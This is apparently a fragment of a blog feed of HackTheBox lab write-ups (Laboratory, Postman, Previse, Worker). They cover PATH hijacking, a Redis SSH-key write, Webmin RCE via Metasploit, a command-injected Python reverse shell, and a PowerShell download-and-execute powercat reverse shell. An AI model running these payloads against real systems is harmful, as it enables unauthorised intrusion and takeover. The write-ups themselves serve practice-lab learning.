+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gmbrr3yt1qj32ri0q2dou.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gmbrr3yt1qj32ri0q2dou.jpg" alt="image-20210104170120629"></a></p>
+<p>使用pspy监控一下</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gmbrrt0rlyj313q0esafj.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gmbrrt0rlyj313q0esafj.jpg" alt="image-20210104170202257"></a></p>
+<p>做了2次chmod</p>
+<blockquote>
+<p>It’s using <code>chmod</code> without specify the full path <code>/usr/bin/chmod</code></p>
+<p>So This is <code>exploited</code> by <code>Path-Hijacking</code>.</p>
+<p>If you don’t known about <strong>Path-Hijacking</strong> read this article.</p>
+<blockquote>
+<p><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">Linux Privilege Escalation Using PATH Variable</a></p>
+</blockquote>
+</blockquote>
+<p>嗯，学习了，因为没有使用完整路径/usr/bin/chmod，所以我们可以通过增加环境变量的方式劫持这个路径，实现提权</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gmbs6no708j30m005idg4.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gmbs6no708j30m005idg4.jpg" alt="image-20210104171618775"></a></p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gmbs665eyqj30p003a0t7.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gmbs665eyqj30p003a0t7.jpg" alt="image-20210104171551327"></a></p>
+<p>写一个chmod用来反弹shell，而后使用/tmp环境变量执行docker-security</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gmbs9czf1zj312m0b2wfh.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gmbs9czf1zj312m0b2wfh.jpg" alt="image-20210104171855309"></a></p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gmbs5xyjg9j30g209875b.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gmbs5xyjg9j30g209875b.jpg" alt="image-20210104171537893"></a></p>
+<p>得到root flag</p>
+<h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p><a href="https://0xdedinfosec.github.io/posts/htb-laboratory/">https://0xdedinfosec.github.io/posts/htb-laboratory/</a></p>
+]]></content>
+      <tags>
+        <tag>Writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackTheBox-Postman</title>
+    <url>/2021/11/04/HackTheBox-Postman/</url>
+    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#nmap -sV -p- 10.10.10.160</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://postimg.cc/2qwqjbCk"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3gdq0rj30jd09942l.jpg" alt="image.png"></a></p>
+<p>发现开启22,80,6379,10000端口,尝试登陆</p>
+<span id="more"></span>
+
+<p><a href="https://postimg.cc/DSQ05JJr"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3jrbffj30pg0laamp.jpg" alt="image.png"></a></p>
+<p><a href="https://postimg.cc/hhwXGqRd"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3j5f9yj30gi0eh3z3.jpg" alt="image.png"></a></p>
+<p>尝试弱口令爆破无果</p>
+<h3 id="利用redis未授权访问漏洞和redis-crackit漏洞得到用户权限"><a href="#利用redis未授权访问漏洞和redis-crackit漏洞得到用户权限" class="headerlink" title="利用redis未授权访问漏洞和redis crackit漏洞得到用户权限"></a>利用redis未授权访问漏洞和redis crackit漏洞得到用户权限</h3><p>注意到redis版本号为4.0.9,redis如果配置不当是可以不用密码就能够访问的</p>
+<p>这里先在kali下安装redis(官网安装，不做演示)</p>
+<p>直接尝试通过6379连接redis</p>
+<p>redis-cli -h 10.10.10.160</p>
+<p><a href="https://postimg.cc/DJ4VM7XF"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3ewxrlj30ls0450t6.jpg" alt="image.png"></a></p>
+<p>而后制作一个ssh私钥</p>
+<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#ssh-keygen -t rsa</span></span><br></pre></td></tr></table></figure>
+
+<p>目录选择/root/.ssh,密码随意,空密码也可以,会生成id_rsa.pub</p>
+<p>将私钥的首部和尾部分别加入两个换行符\n</p>
+<figure class="highlight leaf"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">#</span><span class="params">(<span class="variable">echo</span> -<span class="variable">e</span> <span class="string">&quot;\n\n&quot;</span>; <span class="variable">cat</span> /<span class="variable">root</span>/.<span class="variable">ssh</span>/<span class="variable">id_rsa</span>.<span class="variable">pub</span>; <span class="variable">echo</span> -<span class="variable">e</span> <span class="string">&quot;\n\n&quot;</span>)</span></span> &gt; 1.txt</span><br></pre></td></tr></table></figure>
+
+<p>保存为1.txt,</p>
+<p>清空原有的私钥,再利用crackit漏洞将1.txt的密钥写入redis中</p>
+<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#<span class="regexp">/root/</span>redis-<span class="number">5.0</span>.<span class="number">7</span><span class="regexp">/src/</span>redis-cli -h <span class="number">10.10</span>.<span class="number">10.160</span> flushall</span><br><span class="line">#cat <span class="number">1</span>.txt | <span class="regexp">/root/</span>redis-<span class="number">5.0</span>.<span class="number">7</span><span class="regexp">/src/</span>redis-cli -h <span class="number">10.10</span>.<span class="number">10.160</span> -x set crackit</span><br></pre></td></tr></table></figure>
+
+<p>查看并配置redis中dir的值为目录下的.ssh，修改dbfilename的值为authorized_keys</p>
+<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#redis-cli -h <span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">160</span></span><br><span class="line"><span class="number">10.10.10.160:6379</span>&gt; config get dir</span><br><span class="line"><span class="number">1</span>) <span class="string">&quot;dir&quot;</span></span><br><span class="line"><span class="number">2</span>) <span class="string">&quot;/var/lib/redis/.ssh&quot;</span></span><br><span class="line">(<span class="number">1</span>.05s)</span><br><span class="line"><span class="number">10.10.10.160:6379</span>&gt; config set dir /var/1ib/redis/.ssh</span><br><span class="line">OK</span><br><span class="line"><span class="number">10.10.10.160:6379</span>&gt; config set dbfilename<span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">10.10.10.160:6379</span>&gt; config get dbfilename</span><br><span class="line"><span class="number">1</span>) dbfilename</span><br><span class="line"><span class="number">2</span>) <span class="string">&quot;authorized_keys&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>在这里可能会存在添加不成功的情况，多添加几次就好，最后查看配置确保添加成功</p>
+<p>尝试使用该密钥连接<a href="mailto:redis@10.10.10.160">redis@10.10.10.160</a></p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="selector-id">#ssh</span> -<span class="selector-tag">i</span> /root/<span class="selector-class">.ssh</span>/id_rsa redis<span class="keyword">@10</span>.10.10.160</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://postimg.cc/qhg4yzHx"><img src="https://i.postimg.cc/qRxqf3mS/image.png" alt="image.png"></a></p>
+<p>这里我们将上面的操作写成shell脚本,方便后续进行的登陆操作,因为靶机是大家公用的,所以你写的密钥很有可能过一会就被其他人修改了</p>
+<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#!<span class="regexp">/bin/</span>bash</span><br><span class="line">rm <span class="regexp">/root/</span>.ssh/id*</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line"></span><br><span class="line">(echo -e <span class="string">&quot;\n\n&quot;</span>; cat <span class="regexp">/root/</span>.ssh/id_rsa.pub; echo -e <span class="string">&quot;\n\n&quot;</span>) &gt; foo.txt</span><br><span class="line"></span><br><span class="line"><span class="regexp">/root/</span>redis-<span class="number">5.0</span>.<span class="number">7</span><span class="regexp">/src/</span>redis-cli -h <span class="number">10.10</span>.<span class="number">10.160</span> flushall</span><br><span class="line">cat foo.txt | <span class="regexp">/root/</span>redis-<span class="number">5.0</span>.<span class="number">7</span><span class="regexp">/src/</span>redis-cli -h <span class="number">10.10</span>.<span class="number">10.160</span> -x set crackit</span><br><span class="line"><span class="regexp">/root/</span>redis-<span class="number">5.0</span>.<span class="number">7</span><span class="regexp">/src/</span>redis-cli -h <span class="number">10.10</span>.<span class="number">10.160</span> config set dir <span class="regexp">/var/</span>lib<span class="regexp">/redis/</span>.ssh/</span><br><span class="line"><span class="regexp">/root/</span>redis-<span class="number">5.0</span>.<span class="number">7</span><span class="regexp">/src/</span>redis-cli -h <span class="number">10.10</span>.<span class="number">10.160</span> config set dbfilename <span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line"><span class="regexp">/root/</span>redis-<span class="number">5.0</span>.<span class="number">7</span><span class="regexp">/src/</span>redis-cli -h <span class="number">10.10</span>.<span class="number">10.160</span> save</span><br><span class="line"></span><br><span class="line">ssh -i <span class="regexp">/root/</span>.ssh/id_rsa redis@<span class="number">10.10</span>.<span class="number">10.160</span></span><br></pre></td></tr></table></figure>
+
+<p>保存为exploit.sh,每次运行后输入私钥/留空即可连接</p>
+<p><a href="https://postimg.cc/SXkQz235"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3gwzzej30ky0e40wi.jpg" alt="image.png"></a></p>
+<p><a href="https://postimg.cc/4KdMMX9y"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3k297hj30qo0kb79e.jpg" alt="image.png"></a></p>
+<h3 id="通过redis用户进一步提权"><a href="#通过redis用户进一步提权" class="headerlink" title="通过redis用户进一步提权"></a>通过redis用户进一步提权</h3><p>首先查看passwd文件看看有哪些用户</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">cat <span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://postimg.cc/qh2GDFjg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3ei91xj30li0eigqd.jpg" alt="image.png"></a></p>
+<p>可以看到root Matt redis三个允许登陆的用户,然后使用find命令查看有Matt用户有哪些文件</p>
+<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">find</span> <span class="regexp">/ -user Matt 2&gt;/</span>dev/<span class="keyword">null</span></span><br></pre></td></tr></table></figure>
+
+<p>不显示错误信息可以加上 2&gt;/dev/null</p>
+<p><a href="https://postimg.cc/64pqD2tg"><img src="https://i.postimg.cc/BbxFPHyS/image.png" alt="image.png"></a></p>
+<p>看到有一个/home/Matt/user.txt和/opt/id_rsa.bak</p>
+<p><a href="https://postimg.cc/qNTVqfCM"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3ipfm8j30dd07jwgc.jpg" alt="image.png"></a></p>
+<p>但是我们没有权限,但id_rsa.bak我们是有权限的</p>
+<p><a href="https://postimg.cc/7G8mMzS3"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3i7shfj30es0g1n4u.jpg" alt="image.png"></a></p>
+<p>是Matt的rsa密钥备份文件,就从它下手,首先下载到本地环境</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">scp -i <span class="regexp">/root/</span>.ssh<span class="regexp">/id_rsa redis@10.10.10.160:/</span>opt<span class="regexp">/id_rsa.bak /</span>root</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://postimg.cc/6TQGb3zn"><img src="https://i.postimg.cc/y6mXd3ZQ/image.png" alt="image.png"></a></p>
+<p>kali下有一个非常好用的密钥破解工具JohnTheRipper,这里我们先用它自带的ssh2john脚本将id_rsa.bak转换成John能识别的格式,而后再用john尝试破解,就用kali自带的rockyou字典</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/john/</span>ssh2john.py id_rsa.bak &gt; Matt.key</span><br><span class="line">john Matt.key --wordlist=<span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://postimg.cc/fJNQT3F0"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3fc7qjj30jo07kq4t.jpg" alt="image.png"></a></p>
+<p>可以看到破解出Matt的密码为”computer2008”</p>
+<p>尝试ssh连接一下?</p>
+<p><a href="https://postimg.cc/LJ4dLcm9"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3haoo6j30dc03h74t.jpg" alt="image.png"></a></p>
+<p>被拒绝,这里需要我们从redis用户使用su命令切换过去</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attribute">su - Matt</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://postimg.cc/Ln9R3YTF"><img src="https://i.postimg.cc/xTHCYLN8/image.png" alt="image.png"></a></p>
+<p>这里猜想可能是因为Matt用户设置了禁止直接从ssh登陆</p>
+<h3 id="获取root权限"><a href="#获取root权限" class="headerlink" title="获取root权限"></a>获取root权限</h3><p>通过Matt登陆后,我们使用账号密码登陆<a href="https://10.10.10.160:10000,进入webmin的后台/">https://10.10.10.160:10000,进入webmin的后台</a></p>
+<p><a href="https://postimg.cc/D42V6H1P"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3d1do6j30yy0jlq5g.jpg" alt="image.png"></a></p>
+<p>看到Webmin的 版本为1.910,并且有一个软件包更新模块</p>
+<p>使用msf搜索webmin漏洞</p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#msfconsole</span></span><br><span class="line">msf5&gt;<span class="keyword">search</span> webmin</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://postimg.cc/d7MxngYZ"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3hr7jkj30ya071aco.jpg" alt="image.png"></a></p>
+<p>使用exploit/linux/http/webmin_packageup_rce,配置好options,将ssl设置为true</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">msf5&gt;</span><span class="bash">use exploit/linux/http/webmin_pachage_rce</span></span><br><span class="line"><span class="meta">msf5&gt;</span><span class="bash">show options</span></span><br><span class="line"><span class="meta">msf5&gt;</span><span class="bash"><span class="built_in">set</span> rhost 10.10.10.160</span></span><br><span class="line"><span class="meta">msf5&gt;</span><span class="bash"><span class="built_in">set</span> username Matt</span></span><br><span class="line"><span class="meta">msf5&gt;</span><span class="bash"><span class="built_in">set</span> password computer2008</span></span><br><span class="line"><span class="meta">msf5&gt;</span><span class="bash"><span class="built_in">set</span> lhost 10.10.15.200</span></span><br><span class="line"><span class="meta">msf5&gt;</span><span class="bash"><span class="built_in">set</span> ssl <span class="literal">true</span></span></span><br><span class="line"><span class="meta">msf5&gt;</span><span class="bash">exploit</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://postimg.cc/DWKx1srq"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3fvco2j30rk0fewjk.jpg" alt="image.png"></a></p>
+<p>这里的lhost要填写ifconfig中tun0的ip地址</p>
+<p><a href="https://postimg.cc/xqWMkQym"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glnb3dn8idj30nt0c4adz.jpg" alt="image.png"></a></p>
+<p>成功获取到root权限</p>
+]]></content>
+      <tags>
+        <tag>Writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackTheBox--Previse</title>
+    <url>/2021/11/04/HackTheBox-Previse/</url>
+    <content><![CDATA[<h4 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sC -sV <span class="number">10.129.95.185</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>Access website through port 80, find out there is a login page and no result for Bruteforce, so I change my mind to scan website dirctory.</p>
+<span id="more"></span>
+
+<h4 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h4><p>Noticed that there are many pages status code is 302 but nav.php is 200.</p>
+<p>But every page needs to login, so I use BurpSuite to check these page want to find a footfold. Then I find account.php has a create account function, but it doesn’t check strictly user privilege. So I can create a POST request to create my own account.</p>
+<p>Now I can login with my account, after look around every URL, I find a dangerous code area in source code logs.file which can be download in file.php</p>
+<p>There is a dangerous usage of exec that cause a RCE. Now I can modify the request package and execute my command.</p>
+<p>Listening on local 9999</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvnp <span class="number">9999</span></span><br></pre></td></tr></table></figure>
+
+<p>Send a POST request contains python reverse shell command</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">POST</span> /logs.php HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">10.129.95.185</span></span><br><span class="line"><span class="attribute">Content</span>-Length: <span class="number">9</span></span><br><span class="line"><span class="attribute">Cache</span>-Control: max-age=<span class="number">0</span></span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br><span class="line"><span class="attribute">Origin</span>: http://<span class="number">10.129.95.185</span></span><br><span class="line"><span class="attribute">Content</span>-Type: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win<span class="number">64</span>; x<span class="number">64</span>) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">94</span>.<span class="number">0</span>.<span class="number">4606</span>.<span class="number">81</span> Safari/<span class="number">537</span>.<span class="number">36</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0</span>.<span class="number">8</span>,application/signed-exchange;v=b<span class="number">3</span>;q=<span class="number">0</span>.<span class="number">9</span></span><br><span class="line"><span class="attribute">Referer</span>: http://<span class="number">10.129.95.185</span>/file_logs.php</span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">9</span></span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=mf<span class="number">6</span>socg<span class="number">3</span>i<span class="number">7</span>adog<span class="number">9</span>i<span class="number">9</span>rj<span class="number">0</span>fn<span class="number">1</span>jbk</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line"><span class="attribute">delim</span>=tab; /usr/bin/python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;10.10.14.26&quot;</span>,<span class="number">9999</span>));os.dup<span class="number">2</span>(s.fileno(),<span class="number">0</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">1</span>); os.dup<span class="number">2</span>(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>Now I get a shell of www-data, use MySQL user/pass in config.php to find some information in MySQL</p>
+<p>Find a password cyphertext <code>$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.</code> </p>
+<p>I’m so confused at first why there is an emoji in cyphertext, but I find source code in accounts.php after.</p>
+<p>I find cleartext after many tries, the cypher method calls MD5Cypher in hashcat mode 500</p>
+<p>Use this user/pass I connect the user m4lwhere via SSH</p>
+]]></content>
+      <tags>
+        <tag>Writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>proxychains代理</title>
+    <url>/2021/11/04/HackTheBox-Worker/</url>
+    <content><![CDATA[<p>title: proxychains代理<br>date: 2021-11-04 16:11:49<br>tags: Tools</p>
+<h3 id="Gathering-information"><a href="#Gathering-information" class="headerlink" title="Gathering information"></a>Gathering information</h3><p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1glxntkr6ipj30y40hq41i.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glxntkr6ipj30y40hq41i.jpg" alt="img"></a></p>
+<blockquote>
+<p>Subversion(SVN) 是一个开源的版本控制系統, 也就是说 Subversion 管理着随时间改变的数据。 这些数据放置在一个中央资料档案库(repository) 中。 这个档案库很像一个普通的文件服务器, 不过它会记住每一次文件的变动。 这样你就可以把档案恢复到旧的版本, 或是浏览文件的变动历史。</p>
+</blockquote>
+<blockquote>
+<p><strong>svnserve</strong>是一个轻型的服务器，可以同客户端通过在TCP/IP基础上的自定义有状态协议通讯，客户端通过使用开头为<code>svn://</code>或者<code>svn+ssh://</code><strong>svnserve</strong>的URL来访问一个<strong>svnserve</strong>服务器。这一小节将会解释运行<strong>svnserve</strong>的不同方式，客户端怎样实现服务器的认证，怎样配置版本库恰当的访问控制。</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="svn源码泄漏-版本回退"><a href="#svn源码泄漏-版本回退" class="headerlink" title="svn源码泄漏+版本回退"></a>svn源码泄漏+版本回退</h3><p>通过kali下键入命令</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">svn checkout svn:<span class="regexp">//</span><span class="number">10.129</span>.<span class="number">52.76</span> ./worker</span><br></pre></td></tr></table></figure>
+
+<p>远程服务器受svn管理的源码文件同步到本地worker文件夹</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1glyp9xs7azj30ow09ggoi.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glyp9xs7azj30ow09ggoi.jpg" alt="image-20201224094320420"></a></p>
+<p>隐藏文件夹.svn下wc.db为sqlite数据库文件，使用dbeaver等工具打开</p>
+<p>NODES表下为svn服务器中的文件，PRISTINE表下为文件名的加密值</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1glypfylmv8j31360skwtd.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glypfylmv8j31360skwtd.jpg" alt="image-20201224094907150"></a></p>
+<p>这里没想到有什么利用的点</p>
+<p>moved.txt告诉我们最新版本被移动到了devops.worker.htb</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1glyq3wzpbgj311w0n8dhf.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glyq3wzpbgj311w0n8dhf.jpg" alt="image-20201224101208811"></a></p>
+<p><a href="http://devops.woker.htb需要账号密码登录/">http://devops.woker.htb需要账号密码登录</a></p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1glyq4p16wxj30ow0dwwfa.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glyq4p16wxj30ow0dwwfa.jpg" alt="image-20201224101253954"></a></p>
+<p>论坛中有人跟我在同一个地方卡住了，根据回答，百度了下svn命令</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1glypjauvgbj316e0ggdja.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glypjauvgbj316e0ggdja.jpg" alt="image-20201224095220016"></a></p>
+<p>注意到svn拥有 update/commit/add/delete等方法，尝试增加或更改远程文件</p>
+<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">svn <span class="built_in">log</span> svn:<span class="comment">//10.129.52.76 -v</span></span><br></pre></td></tr></table></figure>
+
+<p>查看版本改动详细信息</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1glysvnw7shj314r0u0avb.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glysvnw7shj314r0u0avb.jpg" alt="image-20201224114800996"></a></p>
+<p>可以看到有一个部署用的ps1被删除了，这时候我们本地使用update回滚到版本r2</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attribute">svn</span> update -r r<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1glysx95qjgj31ao0m0nc4.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glysx95qjgj31ao0m0nc4.jpg" alt="image-20201224114932684"></a></p>
+<h3 id="Azure-Devops-getshell"><a href="#Azure-Devops-getshell" class="headerlink" title="Azure Devops getshell"></a>Azure Devops getshell</h3><p>得到部署时使用的账户，尝试去devops.worker.htb登录，成功</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1glyt2fdtu6j31se0u0toz.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glyt2fdtu6j31se0u0toz.jpg" alt="image-20201224115430667"></a></p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1glyt51c3anj31s40n4jwd.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glyt51c3anj31s40n4jwd.jpg" alt="image-20201224115701705"></a></p>
+<p>这里踩了很多坑：</p>
+<p>1.默认的repo是SmartHotel我们需要换成别的库</p>
+<p>2.换成dimension库（因为之前svn里面测试用这个库，比较眼熟）之后，传上去的shell一直是404，但404的页面和真正不存在的URL404页面还是有区别的</p>
+<p>我确认上传之后看到的404：</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1glz3of18rij30so0f6dhg.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glz3of18rij30so0f6dhg.jpg" alt="image-20201224180135976"></a></p>
+<p>真正的404：</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1glz3p7mlk8j31fq0h6407.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glz3p7mlk8j31fq0h6407.jpg" alt="image-20201224180224358"></a></p>
+<p>这里我也不知道为什么猜想应该是dimension.worker.htb库还不够完善吧，或者是作者想让我们换别的库上传</p>
+<p>总之，接下来git一整套pr操作</p>
+<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="symbol">git</span> checkout -<span class="keyword">b</span> worker</span><br><span class="line"><span class="symbol">git</span> <span class="keyword">add</span> .</span><br><span class="line"><span class="symbol">git</span> commit -m <span class="string">&quot;update&quot;</span></span><br><span class="line"><span class="symbol">git</span> <span class="keyword">push</span> origin worker</span><br></pre></td></tr></table></figure>
+
+<p>可以看到已经可以进行pull request操作了</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1glz3y87co2j31ab0u0n50.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glz3y87co2j31ab0u0n50.jpg" alt="image-20201224181103990"></a></p>
+<p>可以看到已经上传成功</p>
+<p>[<img src="https://fre4k5en.me/Users/fre4k5en/Library/Application%20Support/typora-user-images/image-20201224181600403.png" alt="image-20201224181600403">](<a href="https://fre4k5en.me/Users/fre4k5en/Library/Application">https://fre4k5en.me/Users/fre4k5en/Library/Application</a> Support/typora-user-images/image-20201224181600403.png)</p>
+<p>这里还有一个坑，但其实作者已经在提示我们了，restorer恢复者用户会每隔十分钟重制所有库的内容，这样我们的shell就断了</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1glz44x9ro2j30rg0aajt0.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glz44x9ro2j30rg0aajt0.jpg" alt="image-20201224181729935"></a></p>
+<p>我这里选择传上shell之后在分支里选择锁定</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1glz47435zej31h50u0gqg.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glz47435zej31h50u0gqg.jpg" alt="image-20201224181936388"></a></p>
+<h3 id="get-userflag"><a href="#get-userflag" class="headerlink" title="get userflag"></a>get userflag</h3><p>ok，连接蚁剑，开始翻文件</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwgy1glzaegbf7bj30d00b4q3l.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glzaegbf7bj30d00b4q3l.jpg" alt="image-20201224215414861"></a></p>
+<p>找到passwd文件，里面有很多账户密码信息，其中只有一个是users文件夹里面见过的，robisl</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwgy1glzafnuhfaj311k0jw41m.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glzafnuhfaj311k0jw41m.jpg" alt="image-20201224215524780"></a></p>
+<p>这里先用powershell反弹回一个shell，再切换用户执行cmd</p>
+<p>在上传powercat.ps1时发现没有权限，这里我们使用powershell下载加载执行</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attribute">powershell</span> IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://<span class="number">10.10.14.33</span>/powercat.ps<span class="number">1</span>&#x27;); powercat -c <span class="number">10.10.14.33</span> -p <span class="number">9999</span> -e cmd</span><br></pre></td></tr></table></figure>
+
+<p>本地监听9999得到shell</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">runas <span class="regexp">/noprofile /u</span>ser:robisl cmd</span><br></pre></td></tr></table></figure>
+
+<p>但是输入密码的地方一闪而过，只能想别的办法了</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwgy1glzalrpmhjj30y009k75j.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glzalrpmhjj30y009k75j.jpg" alt="image-20201224220117076"></a></p>
